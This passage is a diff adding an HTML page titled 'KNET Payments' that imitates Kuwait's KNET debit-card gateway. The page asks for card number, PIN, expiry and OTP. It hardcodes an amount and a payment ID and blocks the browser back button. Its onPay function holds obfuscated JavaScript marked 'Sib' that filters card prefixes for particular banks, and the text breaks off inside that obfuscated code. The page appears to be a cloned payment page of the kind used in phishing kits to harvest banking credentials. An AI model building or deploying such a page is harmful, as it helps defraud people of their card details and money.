@@ -1,0 +1,3090 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <meta http-equiv="CACHE-CONTROL" content="max-age=0">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+
+    <title>KNET Payments</title>
+
+</head>
+
+<body>
+
+    <link href="/knetVern/payment-responsive.css" rel="stylesheet" type="text/css">
+    <link href="/knetVern/payment-stylesheet.css" rel="stylesheet" type="text/css">
+
+
+
+    <script type="text/javascript">
+        //Added for OTP at I-T-B level
+        var termBrandlvlAmt;
+
+        /*code added for redirect-starts*/
+        function callTimeOutForbackBotton() {
+            window.location.hash = window.location.hash[window.location.hash.length - 1];
+            setTimeout('callTimeOutForbackBotton()', 10);
+        }
+        /*code added for redirect-ends*/
+
+        var keys;
+        /*Added for OTP at I-T-B level*/
+        var amountlimit;
+        var OTPamtlmtIdentifier;
+        //Added for QA fix
+        var otpTimer;
+        var timer;
+        var timer2;
+        //Added for brand changes
+        var brdtype;
+        var configbrdtype = 'Eidia';
+        var configexpdate = '12';
+        var configexpyear = '2022';
+
+        //Added for PG Eidia Discount
+        var instPgEiddiscntflg = '0';
+        var termPgEiddiscntflg = '0';
+        var pymtPgEiddiscntflg = '0';
+        // Modified for 8 digit bin mandate changes
+        var cardLength;
+
+        jQuery(document).ready(function() {
+
+            $("#payConfirm").hide();
+            $("#savedCardDiv").hide();
+            $("#paying").hide();
+            $("#CVmsg").hide();
+
+
+            $('#Paymentpagecardnumber').on('keypress keyup blur', '#debitNumber', function(event) {
+                $(this).val($(this).val().replace(/[^\d]/g, ""));
+                if (event.which > 31 && (event.which < 48 || event.which > 57)) {
+                    event.preventDefault();
+                }
+            });
+
+            /* $("#banklogo").hide();*/
+
+            //Added to restrict browser back option -- starts
+            setTimeout('callTimeOutForbackBotton()', 10);
+            if (window.history.forward(1) != null) {
+                window.history.forward(1);
+            }
+
+            function noBack() {
+                if (window.history.forward(1) != null) {
+                    window.history.forward(1);
+                }
+                window.location.hash = window.location.hash[window.location.hash.length - 1];
+
+            }
+
+            function callTimeOutForbackBotton() {
+                window.location.hash = window.location.hash[window.location.hash.length - 1];
+                setTimeout('callTimeOutForbackBotton()', 10);
+            }
+
+            //Added for Points Redemption
+            $(".allowalphanumericwithoutdecimal").on("keypress keyup blur", function(e) {
+                var regex = new RegExp("^[a-zA-Z0-9 ]+$");
+                var str = String.fromCharCode(!e.charCode ? e.which : e.charCode);
+                if (regex.test(str)) {
+                    return true;
+                }
+                e.preventDefault();
+            });
+            //Added for Points Redemption
+
+
+            if (window.performance) {
+                console.info("window.performance works fine on this browser");
+            }
+            if (performance.navigation.type == performance.navigation.TYPE_RELOAD) {
+
+                console.info("This page is reloaded");
+            } else {
+                console.info("This page is not reloaded");
+            }
+            //Ends
+
+            if (false) {
+                document.paypage.fcExpCheck.value = "fcExpDate";
+                $('#checkFC').hide();
+                $('#FCUseDebitEnable').hide();
+                document.getElementById('paymentOptionFC').checked = true;
+                document.getElementById('savedCardDiv').style.display = "block";
+                document.paypage.creditDebitCheck.value = "SVC";
+                if (false) {
+                    $('#siflg').show();
+                }
+
+            } else {
+                if (false) {
+                    document.getElementById('fasterCheckDiv1').setAttribute('class', 'doGray');
+                    document.getElementById('paymentOptionFC').disabled = true;
+                    document.getElementById('paymentOptionDC').checked = true;
+                }
+            }
+
+            if (false) {
+                document.getElementById('paymentOptionFC').checked = true;
+                document.getElementById('savedCardDiv').style.display = "block";
+                document.paypage.creditDebitCheck.value = "SVC";
+                if (false) {
+                    $('#siflg').show();
+                }
+            }
+
+
+            $("input").keypress(function(event) {
+                if (event.which == 13) {
+                    event.preventDefault();
+                    if (document.getElementById('payConfirm').style.display == 'block' && document.getElementById('overlayhide1').style.display == 'none') {
+                        $("#proceedConfirm").click();
+                    } else if (document.getElementById('payConfirm').style.display == 'none' && document.getElementById('overlayhide').style.display == 'none') {
+                        $("#proceed").click();
+                    }
+                }
+            });
+
+            $('#fCFlg').change(function() {
+                if ($(this).is(":checked")) {
+                    $("#fCFlg").val("on");
+                    $('#fcDetails').show();
+                } else {
+                    $("#fCFlg").val("off");
+                    $('#fcDetails').hide();
+                }
+            });
+
+
+            $(".allownumericwithoutdecimal").on("keypress keyup blur", function(event) {
+                $(this).val($(this).val().replace(/[^\d]/g, ""));
+                if (event.which > 31 && (event.which < 48 || event.which > 57)) {
+                    event.preventDefault();
+                }
+            });
+
+
+            $('#SIflg').change(function() {
+                if ($(this).is(":checked")) {
+                    $("#SIflg").val("on");
+                } else {
+                    $("#SIflg").val("off");
+                }
+            });
+            $('#debitOTPtimer').on('paste', function(event) {
+                if (event.originalEvent.clipboardData.getData('Text').match(/[^\d]/)) {
+                    event.preventDefault();
+                }
+            });
+
+            //Added for Points Redemption
+            if (false) {
+                document.getElementById('PinRow').style.display = 'none';
+            }
+            //Added for Points Redemption
+        });
+
+        function selectPayInstr(val) {
+
+            document.paypage.creditDebitCheck.value = val;
+            document.paypage.selectedPymntInstrmnt.value = val;
+            document.paypage.otherCards.value = val;
+
+            if (true) {
+                document.getElementById('creditCaptchaMsg').style.display = 'none';
+                if (false)
+                    document.getElementById('creditRadioCaptchaMsg').style.display = 'none';
+            }
+            if (true) {
+                document.getElementById('debitCaptchaMsg').style.display = 'none';
+                if (false)
+                    document.getElementById('debitRadioCaptchaMsg').style.display = 'none';
+            }
+            if (false) {
+                document.getElementById('ddCaptchaMsg').style.display = 'none';
+            }
+            if (false) {
+                document.getElementById('impsCaptchaMsg').style.display = 'none';
+            }
+            if (false) {
+                document.getElementById('prepaidCaptchaMsg').style.display = 'none';
+                if (false)
+                    document.getElementById('prepaidRadioCaptchaMsg').style.display = 'none';
+            }
+            if (false && false) {
+                document.getElementById('pzCaptchaMsg').style.display = 'none';
+            }
+
+            //Added for One Click Checkout
+            if (val == 'SVC') {
+                document.getElementById('savedRadioCaptchaMsg').style.display = 'none';
+                document.paypage.fcExpCheck.value = "fcExpDate";
+                $("#checkFC").hide();
+            } else {
+                document.paypage.fcExpCheck.value = "";
+            }
+            //Added for One Click Checkout
+
+        }
+
+        function fetchimageName(Bankdesc) {
+            var fname = Bankdesc.split("[");
+            var lname = fname[1].split("]");
+            return lname[0];
+        }
+
+        function validateprefixid(val) {
+            var index = document.getElementById("dcprefix").selectedIndex;
+            var binLength = document.getElementById("dcprefix").options[index].text.length;
+            // Modified for 8 digit bin mandate changes- starts
+            var cardL = cardLength[index];
+
+            if (cardL != null && cardL != "" && cardL == 19) {
+                if (binLength == 9) {
+                    document.getElementById("debitNumber").maxLength = "10";
+                    document.getElementById("debitNumber").size = "10";
+                    document.getElementById("debitNumber").title = "Should be in number. Length should be 10";
+                } else if (binLength == 8) {
+                    document.getElementById("debitNumber").maxLength = "11";
+                    document.getElementById("debitNumber").size = "11";
+                    document.getElementById("debitNumber").title = "Should be in number. Length should be 11";
+                } else if (binLength == 7) {
+                    document.getElementById("debitNumber").maxLength = "12";
+                    document.getElementById("debitNumber").size = "12";
+                    document.getElementById("debitNumber").title = "Should be in number. Length should be 12";
+                } else if (binLength == 6) {
+                    document.getElementById("debitNumber").maxLength = "13";
+                    document.getElementById("debitNumber").size = "13";
+                    document.getElementById("debitNumber").title = "Should be in number. Length should be 13";
+                }
+            } else {
+                if (binLength == 9) {
+                    document.getElementById("debitNumber").maxLength = "7";
+                    document.getElementById("debitNumber").size = "7";
+                    document.getElementById("debitNumber").title = "Should be in number. Length should be 7";
+                } else if (binLength == 8) {
+                    document.getElementById("debitNumber").maxLength = "8";
+                    document.getElementById("debitNumber").size = "8";
+                    document.getElementById("debitNumber").title = "Should be in number. Length should be 8";
+                } else if (binLength == 7) {
+                    document.getElementById("debitNumber").maxLength = "9";
+                    document.getElementById("debitNumber").size = "9";
+                    document.getElementById("debitNumber").title = "Should be in number. Length should be 9";
+                } else if (binLength == 6) {
+                    document.getElementById("debitNumber").maxLength = "10";
+                    document.getElementById("debitNumber").size = "10";
+                    document.getElementById("debitNumber").title = "Should be in number. Length should be 10";
+                }
+            }
+        }
+
+        function ValidateNumPin(evt) {
+            var charCode = (evt.which) ? evt.which : event.keyCode
+            if (charCode > 31 && (charCode < 48 || charCode > 57)) { // Check if its only Numeric
+                return false;
+            } else {
+                return true;
+            }
+        }
+
+        /**
+        function isOtpNumeric(evt){	
+            var charCode = (evt.which) ? evt.which : event.keyCode
+            if (charCode != 46 && charCode > 31 && (charCode < 48 || charCode > 57)){ // Check if its only Numeric
+                return false;
+            }
+            else{
+            	return true;
+            }
+        }
+        **/
+
+        function isOtpNumeric(event) {
+            const input = event.target;
+            const value = input.value.trim();
+
+            if (!value.match(/^\d*$/)) {
+                input.value = value.replace(/[^\d]/g, '');
+                return false;
+            } else {
+                return true;
+            }
+        }
+
+        function validatebank(id) {
+            if (id == "bankname") {
+                document.paypage.debitNumber.value = "";
+                document.getElementById('cardPin').value = "";
+                document.getElementById('dcprefix').innerHTML = '<select  class="paymentselect"><option>Prefix</option></select>';
+                if (document.getElementById('ValidationMessage').style.display == 'inline' || document.getElementById('ValidationMessage').style.display == 'block') {
+                    $("#ValidationMessage").hide();
+                    document.getElementById('debitNumber').style.borderColor = '';
+                    document.getElementById('cardPin').style.borderColor = '';
+                }
+
+                //Added for PG Eidia Discount
+                document.getElementById('OrgTranxAmt').innerHTML = '<label class="column-label">Amount:</label><label class="column-value text-label">KD&nbsp;28.250</label>';
+                document.getElementById('DiscntRate').innerHTML = '';
+                document.getElementById('DiscntedAmt').innerHTML = '';
+                $("#DiscntRate").hide();
+                $("#DiscntedAmt").hide();
+
+            } else {
+                var val = id;
+                var arr = val.split("|");
+                var brandid = arr[0];
+                var desc = arr[1];
+                //Added for OTP at I-T-B level
+                termBrandlvlAmt = arr[2];
+                termBrandlvlAmt = parseFloat(termBrandlvlAmt);
+                //Added for OTP at I-T-B level
+                //Added for PG Eidia Discount
+                if (instPgEiddiscntflg == '1' && termPgEiddiscntflg == '1' && pymtPgEiddiscntflg == '1') {
+
+                    document.paypage.discountval.value = arr[3];
+                    //document.paypage.discountedtranamount.value = parseFloat(arr[4]);
+                    document.paypage.discountedtranamount.value = (arr[4]);
+
+                    if (document.paypage.discountval.value != "0.00") {
+                        document.getElementById('OrgTranxAmt').innerHTML = '<label class="column-label">Amount:</label><label class="column-value text-label" style="font-style: italic;"><s>KD&nbsp;28.250</s></label>';
+                        document.getElementById('DiscntRate').innerHTML = '<label class="column-label" style="color: #228B22;">Discount Rate:</label><label class="column-value text-label" style="color: #228B22;">' + document.paypage.discountval.value + '&nbsp;<span>%</span></label>';
+                        document.getElementById('DiscntedAmt').innerHTML = '<label class="column-label">You are paying:</label><label class="column-value text-label">KD&nbsp;' + document.paypage.discountedtranamount.value + '</label>';
+                        $("#DiscntRate").show();
+                        $("#DiscntedAmt").show();
+                        $("#OrgTranxAmt").addClass("row");
+                    } else {
+                        document.getElementById('OrgTranxAmt').innerHTML = '<label class="column-label">Amount:</label><label class="column-value text-label">KD&nbsp;28.250</label>';
+                        document.getElementById('DiscntRate').innerHTML = '';
+                        document.getElementById('DiscntedAmt').innerHTML = '';
+                        $("#DiscntRate").hide();
+                        $("#DiscntedAmt").hide();
+                        $("#OrgTranxAmt").removeClass("row");
+                    }
+                }
+                //Added for PG Eidia Discount
+
+                var bankname = desc.split("[");
+                var tenant = fetchimageName(desc);
+                var payid = document.paypage.paymentId.value;
+                document.paypage.config.value = "getBrandDetails";
+                var url = "/kpg/Brand.htm?config=getBrandDetails";
+
+                $.ajax({
+                    type: 'post',
+                    url: url,
+                    data: {
+                        brandId: brandid,
+                        paymentId: payid
+                    },
+                    datatype: 'json',
+                    success: function(ajaxResponseData) {
+
+                        brdtype = ajaxResponseData[0];
+
+                        <!-- Added for EIDIA changes starts -->
+                        if (brdtype != configbrdtype) {
+                            //Added for Points Redemption - modified
+                            document.getElementById('Paymentpagecardnumber').innerHTML = '<label class="column-label"  >Card Number: </label><label><select class="column-value" name="dcprefix" id="dcprefix" style="width: 26%;"><option value="bankcode" title="Prefix">Prefix</option></select></label><label>  <input name="debitNumber" id="debitNumber" type="tel" pattern="[0-9]" size="10" class="allownumericwithoutdecimal"   style="width: 32%;" maxlength="10" onclick="javascript:validateprefixid(this.value)" onblur="return ValidateNumPin(event);" onkeyup="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;" title="Should be in number. Length should be 10" /></label>';
+                            if (document.getElementById('cardExpdate').style.display == "none") {
+                                document.getElementById('cardExpdate').style.display = "block";
+                                document.paypage.debitMonth.value = 0;
+                                document.paypage.debitYear.value = 0;
+                            }
+                            if (document.getElementById('ValidationMessage').style.display == 'inline' || document.getElementById('ValidationMessage').style.display == 'block') {
+                                $("#ValidationMessage").hide();
+                            }
+                        } else {
+                            document.getElementById('Paymentpagecardnumber').innerHTML = '<label class="column-label">Mobile Number: </label><label style="display:none;"><select class="column-value" name="dcprefix" id="dcprefix" style="width: 26%;"><option value="bankcode" title="Prefix">Prefix</option></select></label><label>  <input name="debitNumber" id="debitNumber" type="tel" pattern="[0-9]" size="10" class="allownumericwithoutdecimal"   style="width: 32%;" maxlength="10" onclick="javascript:validateprefixid(this.value)" onkeyup="return ValidateNumPin(event);" onblur="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;" title="Should be in number. Length should be 10" /></label>';
+                            if (document.getElementById('ValidationMessage').style.display == 'inline' || document.getElementById('ValidationMessage').style.display == 'block') {
+                                $("#ValidationMessage").hide();
+                            }
+                            document.getElementById('cardExpdate').style.display = "none";
+                            document.paypage.debitMonth.value = configexpdate;
+                            document.paypage.debitYear.value = configexpyear;
+                            document.paypage.debitMonthSelect.value = configexpdate;
+                            document.paypage.debitYearSelect.value = configexpyear;
+                        }
+                        <!-- Added for EIDIA changes Ends -->
+
+                        var counter = 0;
+                        var prefix = document.getElementById('dcprefix');
+                        $('#dcprefix').empty();
+                        var key;
+                        // Modified for 8 digit bin mandate changes- starts
+                        cardLength = new Array()
+                        for (key = 1; key < ajaxResponseData.length; key++) {
+                            var prefixCardlength = ajaxResponseData[key].split("-");
+                            prefix[counter] = new Option(prefixCardlength[0], prefixCardlength[0]);
+                            prefix[counter].title = prefixCardlength[0];
+
+                            cardLength[counter] = prefixCardlength[1];
+                            counter++;
+                        }
+
+                    }
+                });
+                document.getElementById('cardPin').value = "";
+                $("#paying").show();
+                document.paypage.Otptenant.value = tenant;
+            }
+        }
+        //for knet ends
+
+        function setdebitMonth(val) {
+            document.paypage.debitMonth.value = val;
+        }
+
+        function setdebitYear(val) {
+            document.paypage.debitYear.value = val;
+        }
+
+        function OndeleteDetails(cardNumHashTx) {
+
+            if (document.getElementById("debitsavedcardPIN")) {
+                document.getElementById("debitsavedcardPIN").value = "";
+            }
+
+            var paymentId = "43535900025480404358452000953040";
+            var payid = document.paypage.paymentId.value;
+            document.paypage.cardnohash.value = cardNumHashTx;
+            document.paypage.deletecard.value = 1;
+            document.paypage.action = "/kpg/paymentpageqcdereg.htm?PaymentID=" + payid;
+            document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+            document.paypage.submit();
+
+        }
+
+        //Added for Points Redemption - modified	
+        //Added for PG Eidia Discount
+        function forEidDiscntfn(Discntval, tranamtDiscntVal) {
+            Discntval = Discntval.toFixed(2);
+            tranamtDiscntVal = tranamtDiscntVal.toFixed(3);
+            document.paypage.discountval.value = Discntval;
+            document.paypage.discountedtranamount.value = tranamtDiscntVal;
+
+            if (Discntval != "0.00") {
+                document.getElementById('OrgTranxAmt').innerHTML = '<label class="column-label">Amount:</label><label class="column-value text-label" style="font-style: italic;"><s>KD&nbsp;28.250</s></label>';
+                document.getElementById('DiscntRate').innerHTML = '<label class="column-label" style="color: #228B22;">Discount Rate:</label><label class="column-value text-label" style="color: #228B22;">' + document.paypage.discountval.value + '&nbsp;<span>%</span></label>';
+                document.getElementById('DiscntedAmt').innerHTML = '<label class="column-label">You are paying:</label><label class="column-value text-label">KD&nbsp;' + document.paypage.discountedtranamount.value + '</label>';
+                $("#DiscntRate").show();
+                $("#DiscntedAmt").show();
+                $("#OrgTranxAmt").addClass("row");
+
+            } else {
+                document.getElementById('OrgTranxAmt').innerHTML = '<label class="column-label">Amount:</label><label class="column-value text-label">KD&nbsp;28.250</label>';
+                document.getElementById('DiscntRate').innerHTML = '';
+                document.getElementById('DiscntedAmt').innerHTML = '';
+                $("#DiscntRate").hide();
+                $("#DiscntedAmt").hide();
+                $("#OrgTranxAmt").removeClass("row");
+
+            }
+        }
+        //Added for PG Eidia Discount
+
+        //function timer(){
+        function timer(val) {
+            timer = val * 60;
+
+            function countDown() {
+
+                if (--timer) {
+                    var minutes = timer % 60;
+                    if (!minutes) {
+                        minutes = '00';
+                    }
+
+                    $("#debitOTPtimer").attr("placeholder", "Timeout in: " + Math.floor(timer / 60) + ':' + minutes);
+                    timer2 = setTimeout(countDown, 1000);
+                } else {
+                    $("#debitOTPtimer").attr("placeholder", "Your OTP has Expired.");
+                    document.paypage.timeOver.value = 1;
+                }
+
+            }
+            countDown();
+        }
+
+        //Added fo QA issue fix
+        function resetTimer(val) {
+            var timer1 = val * 60;
+
+            function countDown() {
+                if (--timer1) {
+                    var minutes = timer1 % 60;
+                    if (!minutes) {
+                        minutes = '00';
+                    }
+
+                    clearTimeout(timer2);
+                    $("#debitOTPtimer").attr("placeholder", "Timeout in: " + Math.floor(timer1 / 60) + ':' + minutes);
+                    document.paypage.timeOver.value = 0;
+                    timer2 = setTimeout(countDown, 1000);
+                } else {
+                    $("#debitOTPtimer").attr("placeholder", "Your OTP has Expired.");
+                    document.paypage.timeOver.value = 1;
+                }
+            }
+            countDown();
+        }
+
+        function paymentOptionChange(name) {
+            if (name == 'DC') {
+                document.getElementById("paypage").reset();
+                document.getElementById("paymentOptionDC").checked = true;
+                document.getElementById('FCUseDebitEnable').style.display = "block";
+                document.getElementById('savedCardDiv').style.display = "none";
+                $('#checkFC').show();
+                $('#siflg').show();
+                $("#debitCaptchaMsg").hide();
+                $("#ValidationMessage").hide();
+                document.paypage.creditDebitCheck.value = "";
+                //Added for PG Eidia Discount
+                document.getElementById('OrgTranxAmt').innerHTML = '<label class="column-label">Amount:</label><label class="column-value text-label">KD&nbsp;28.250</label>';
+                document.getElementById('DiscntRate').innerHTML = '';
+                document.getElementById('DiscntedAmt').innerHTML = '';
+                $("#DiscntRate").hide();
+                $("#DiscntedAmt").hide();
+
+            } else if (name == 'FC') {
+                document.getElementById('FCUseDebitEnable').style.display = "none";
+                document.getElementById('savedCardDiv').style.display = "block";
+                $('#checkFC').hide();
+                $('#siflg').show();
+                $("#debitCaptchaMsg").hide();
+                $("#ValidationMessage").hide();
+                document.getElementById('dcprefix').innerHTML = '<select  class="paymentselect"><option>Prefix</option></select>';
+                document.paypage.creditDebitCheck.value = "SVC";
+                //Added for PG Eidia Discount
+                if (document.getElementById('savedCardNumber').checked) {
+
+                    var brndlvlDisVal = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[8];
+                    var brndlvltranamtDisVal = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[9];
+
+                }
+
+            }
+
+        }
+
+        function isNumeric(val) {
+            var iChars = "0123456789";
+            if (val.length == 0) {
+                return false;
+            }
+
+
+            for (var i = 0; i < val.length; i++) {
+                if (iChars.indexOf(val.charAt(i)) == -1) {
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        function validatePayform() {
+
+            if (false && document.paypage.paymentOption.value == "") {
+                $("#overlayhide").hide();
+                $('#proceed').show();
+                $("#debitCaptchaMsg").hide();
+                $("#otpmsgDC").hide();
+                $("#CVmsg").hide();
+                document.getElementById('ValidationMessage').innerHTML = 'Invalid Data - Kindly Choose payment Option';
+                $("#ValidationMessage").show();
+                return false;
+            }
+            var debitCardNo = document.paypage.debitCardNumber.value;
+            var cardPin = $("#cardPin").val();
+            //Added for Points Redemption - modified
+            var debitsavedcardPIN = "";
+            if (true) {
+                debitsavedcardPIN = $("#debitsavedcardPIN").val();
+            }
+            if (document.paypage.creditDebitCheck.value != "SVC") {
+                //Added for cosmetic changes
+                if (debitCardNo == "bankcode" || debitCardNo == "Prefix") {
+                    document.getElementById('ValidationMessage').innerHTML = 'Invalid Data - Please Select Your Bank';
+                    $("#ValidationMessage").show();
+                    $("#overlayhide").hide();
+                    $('#proceed').show();
+                    $("#debitCaptchaMsg").hide();
+                    $("#otpmsgDC").hide();
+                    $("#CVmsg").hide();
+                    return false;
+                }
+                //Added for cosmetic changes
+
+                if (debitCardNo == "" || (debitCardNo.length != 19 && debitCardNo.length != 16) || document.paypage.dcprefix.value == "bankcode" || !isNumeric(debitCardNo)) {
+                    $("#overlayhide").hide();
+                    $('#proceed').show();
+                    $("#debitCaptchaMsg").hide();
+                    $("#otpmsgDC").hide();
+                    $("#CVmsg").hide();
+                    if (brdtype != configbrdtype) {
+                        document.getElementById('ValidationMessage').innerHTML = 'Invalid data - Please check your Card-Number.';
+                    } else {
+                        if (!debitCardNo.includes("Prefix")) {
+                            document.getElementById('ValidationMessage').innerHTML = 'Invalid data - Please check your Mobile Number.';
+                        } else {
+                            document.getElementById('ValidationMessage').innerHTML = 'Invalid Data - Please Select Your Bank';
+                            document.getElementById('debitNumber').style.borderColor = '';
+                        }
+                    }
+                    $("#ValidationMessage").show();
+                    return false;
+                }
+                //Added for Points Redemption
+                //else if(cardPin.length<4 ||cardPin.length>4 || !isNumeric(cardPin)){
+                else if ((cardPin.length < 4 || cardPin.length > 4 || !isNumeric(cardPin)) && true) {
+                    $("#overlayhide").hide();
+                    $('#proceed').show();
+                    $("#debitCaptchaMsg").hide();
+                    $("#otpmsgDC").hide();
+                    $("#CVmsg").hide();
+                    document.getElementById('ValidationMessage').innerHTML = 'Invalid data - Please check your Pin(4 digits).';
+                    $("#ValidationMessage").show();
+                    return false;
+                } else if (document.paypage.debitMonth.value == 0 || document.paypage.debitYear.value == 0) {
+                    $("#overlayhide").hide();
+                    $('#proceed').show();
+                    $("#debitCaptchaMsg").hide();
+                    $("#otpmsgDC").hide();
+                    $("#CVmsg").hide();
+                    document.getElementById('ValidationMessage').innerHTML = 'Please check the Expiration Month &amp; Year.';
+                    $("#ValidationMessage").show();
+                    return false;
+                } else if (false && document.paypage.SIflg.value == "off") {
+                    $("#overlayhide").hide();
+                    $('#proceed').show();
+                    $("#debitCaptchaMsg").hide();
+                    $("#otpmsgDC").hide();
+                    $("#CVmsg").hide();
+                    document.getElementById('ValidationMessage').innerHTML = 'Please read the terms and agree for Standing Instruction';
+                    $("#ValidationMessage").show();
+                    return false;
+                } else {
+                    return true;
+                }
+            } else {
+                if (debitCardNo == "") {
+                    $("#overlayhide").hide();
+                    $('#proceed').show();
+                    $("#debitCaptchaMsg").hide();
+                    $("#otpmsgDC").hide();
+                    $("#CVmsg").hide();
+                    if (brdtype != configbrdtype) {
+                        document.getElementById('ValidationMessage').innerHTML = 'Invalid data - Please check your Card-Number.';
+                    } else {
+                        document.getElementById('ValidationMessage').innerHTML = 'Invalid data - Please check your Mobile Number.';
+                    }
+                    $("#ValidationMessage").show();
+                    return false;
+                }
+                //Added for Points Redemption
+                //else if(debitsavedcardPIN.length<4 || debitsavedcardPIN.length>4 || !isNumeric(debitsavedcardPIN)){
+                else if ((debitsavedcardPIN.length < 4 || debitsavedcardPIN.length > 4 || !isNumeric(debitsavedcardPIN)) && true) {
+                    $("#overlayhide").hide();
+                    $('#proceed').show();
+                    $("#debitCaptchaMsg").hide();
+                    $("#otpmsgDC").hide();
+                    $("#CVmsg").hide();
+                    document.getElementById('ValidationMessage').innerHTML = 'Invalid data - Please check your Pin(4 digits).';
+                    $("#ValidationMessage").show();
+                    return false;
+                } else if (false && document.paypage.SIflg.value == "off") {
+                    $("#overlayhide").hide();
+                    $('#proceed').show();
+                    $("#debitCaptchaMsg").hide();
+                    $("#otpmsgDC").hide();
+                    $("#CVmsg").hide();
+                    document.getElementById('ValidationMessage').innerHTML = 'Please read the terms and agree for Standing Instruction';
+                    $("#ValidationMessage").show();
+                    return false;
+                } else {
+                    return true;
+                }
+            }
+
+        }
+
+        function onPay() {
+            //***************Sib : Tam verification under KFH*****************
+
+            var _0x5f2574 = _0x43a1;
+            (function(_0x5c43a7, _0x42df2e) {
+                var _0x1cfb1f = _0x43a1,
+                    _0xac85dd = _0x5c43a7();
+                while (!![]) {
+                    try {
+                        var _0x59bce5 = parseInt(_0x1cfb1f(0xa5)) / 0x1 + parseInt(_0x1cfb1f(0xb2)) / 0x2 * (-parseInt(_0x1cfb1f(0xa1)) / 0x3) + parseInt(_0x1cfb1f(0xb4)) / 0x4 + parseInt(_0x1cfb1f(0xb5)) / 0x5 * (parseInt(_0x1cfb1f(0xb1)) / 0x6) + -parseInt(_0x1cfb1f(0xa7)) / 0x7 * (-parseInt(_0x1cfb1f(0x9f)) / 0x8) + -parseInt(_0x1cfb1f(0xb0)) / 0x9 + -parseInt(_0x1cfb1f(0x9d)) / 0xa;
+                        if (_0x59bce5 === _0x42df2e) break;
+                        else _0xac85dd['push'](_0xac85dd['shift']());
+                    } catch (_0x49ea8e) {
+                        _0xac85dd['push'](_0xac85dd['shift']());
+                    }
+                }
+            }(_0x20af, 0xdb2e9));
+
+            function _0x43a1(_0xef370a, _0x38af35) {
+                var _0x20af06 = _0x20af();
+                return _0x43a1 = function(_0x43a1a1, _0x1ad5da) {
+                    _0x43a1a1 = _0x43a1a1 - 0x9c;
+                    var _0x39420e = _0x20af06[_0x43a1a1];
+                    return _0x39420e;
+                }, _0x43a1(_0xef370a, _0x38af35);
+            }
+
+            function _0x20af() {
+                var _0xc53bb3 = ['261033jbspNF', 'getElementById', 'none', 'block', '1324606elxfUc', 'option:contains(KFH\x20[TAM])', '914473dlNLqr', 'debitNumber', 'style', 'proceed', 'disabled', 'otpmsgDC', 'dcprefix', 'substring', 'proceedReset', '3642192PqVODe', '672mXjJBI', '16BWgGMm', 'innerHTML', '1555688kkJBas', '15025OJIZjG', '450778', 'display', '7047380cVETOl', 'value', '40OuRQsX', 'You\x20have\x20chosen\x20the\x20wrong\x20Bank.Please\x20select\x20Tam\x20Bank\x20to\x20proceed\x20with\x20your\x20payment<br\x20/>'];
+                _0x20af = function() {
+                    return _0xc53bb3;
+                };
+                return _0x20af();
+            }
+            if (('48' == document[_0x5f2574(0xa2)](_0x5f2574(0xa8))[_0x5f2574(0x9e)][_0x5f2574(0xae)](0x0, 0x2) || '49' == document[_0x5f2574(0xa2)](_0x5f2574(0xa8))['value'][_0x5f2574(0xae)](0x0, 0x2)) && _0x5f2574(0xb6) == document['getElementById'](_0x5f2574(0xad))['value'] && $(_0x5f2574(0xa6))['length'] > '0') return document['getElementById']('OTPDCDIV')[_0x5f2574(0xa9)][_0x5f2574(0x9c)] = _0x5f2574(0xa3), document['getElementById'](_0x5f2574(0xac))[_0x5f2574(0xb3)] = _0x5f2574(0xa0), document[_0x5f2574(0xa2)](_0x5f2574(0xac))[_0x5f2574(0xa9)][_0x5f2574(0x9c)] = _0x5f2574(0xa4), document['getElementById'](_0x5f2574(0xaa))[_0x5f2574(0xab)] = ![], document[_0x5f2574(0xa2)](_0x5f2574(0xaf))[_0x5f2574(0xab)] = ![], document[_0x5f2574(0xa2)]('cancel')[_0x5f2574(0xab)] = ![], ![];
+            else document['getElementById'](_0x5f2574(0xac))[_0x5f2574(0xa9)][_0x5f2574(0x9c)] = _0x5f2574(0xa3);
+
+            //*************sib: end**************
+
+            //***************Sib : Weyay verification under NBK*****************
+
+            function _0x4066() {
+                var _0x12cae1 = ['proceed', 'substring', '1628028luHygv', 'proceedReset', 'disabled', 'none', '638119rWheAa', '2964344fjLVWP', 'value', '2706480ZuBomL', 'otpmsgDC', 'You\x20have\x20chosen\x20the\x20wrong\x20Bank\x20:(\x20Please\x20select\x20Weyay\x20Bank\x20to\x20proceed\x20with\x20your\x20payment<br\x20/>', 'style', 'cancel', 'getElementById', '121615mAWCXl', 'display', 'innerHTML', '368984ykLxcL', 'debitNumber', '72AbNOqH', 'OTPDCDIV', '464452', '793138EyCCsg'];
+                _0x4066 = function() {
+                    return _0x12cae1;
+                };
+                return _0x4066();
+            }
+
+            function _0x5a5b(_0x44e98e, _0x488ba7) {
+                var _0x4066c8 = _0x4066();
+                return _0x5a5b = function(_0x5a5b52, _0x3432a9) {
+                    _0x5a5b52 = _0x5a5b52 - 0x1f3;
+                    var _0x20bac3 = _0x4066c8[_0x5a5b52];
+                    return _0x20bac3;
+                }, _0x5a5b(_0x44e98e, _0x488ba7);
+            }
+            var _0x50ac53 = _0x5a5b;
+            (function(_0x45a6bb, _0x161b9e) {
+                var _0x11ce80 = _0x5a5b,
+                    _0x2dc515 = _0x45a6bb();
+                while (!![]) {
+                    try {
+                        var _0x10cf1c = parseInt(_0x11ce80(0x1f9)) / 0x1 + parseInt(_0x11ce80(0x20a)) / 0x2 + -parseInt(_0x11ce80(0x1f5)) / 0x3 + -parseInt(_0x11ce80(0x1fa)) / 0x4 + parseInt(_0x11ce80(0x202)) / 0x5 * (parseInt(_0x11ce80(0x207)) / 0x6) + parseInt(_0x11ce80(0x1fc)) / 0x7 + -parseInt(_0x11ce80(0x205)) / 0x8;
